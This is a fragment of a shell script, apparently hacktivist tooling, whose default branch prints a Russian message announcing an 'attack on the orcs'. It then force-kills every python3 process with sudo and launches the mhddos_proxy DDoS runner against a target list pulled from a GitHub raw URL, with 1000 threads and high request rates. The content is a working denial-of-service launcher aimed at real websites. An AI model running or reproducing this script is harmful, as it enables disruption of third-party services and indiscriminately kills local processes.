...
case "$item" in
    ...
    *) echo "По умолчанию выбрано одно ядро. Начинаем атаку на орков"
	sudo pkill -9 -f "python3"
	cd /root/mhddos_proxy; python3 runner.py -c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer7.lst --http-methods STRESS GET -t 1000 -p 350 --rpc 2000 --debug
	;;
esac